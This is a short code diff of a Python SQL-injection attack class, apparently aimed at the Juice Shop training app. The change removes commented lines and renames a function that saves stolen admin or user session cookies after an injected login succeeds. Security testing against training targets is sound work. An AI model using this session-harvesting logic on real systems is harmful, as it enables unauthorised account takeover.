@@ -27,13 +27,8 @@ class SQL_injector(a.attack_inter):
                 print(response.status_code)
                 if response.status_code == 200:
                     print("Valid script: ", json_data['email'])
-                    #self.juice_session.cookies.save()
-                    # new_token = res_payload_dict["authentication"]['token']
-                    # print(new_token)
-                    # new_cookie = a.COOKIE
-                    # new_cookie["token"] = new_token
                     newCookie, newHeader = a.modify_cookie_header(response)
-                    a.auth_writer('admin',newCookie,newHeader)
+                    a.auth_write('admin',newCookie,newHeader)
                     break
         else:
             headers, json_data = self.generator(userInput)
@@ -43,5 +38,5 @@ class SQL_injector(a.attack_inter):
                 print(response.text)
                 print("Valid script: ", json_data['email'])
                 newCookie, newHeader = a.modify_cookie_header(response)
-                a.auth_writer(username,newCookie,newHeader)
+                a.auth_write(username,newCookie,newHeader)
             return response.status_code
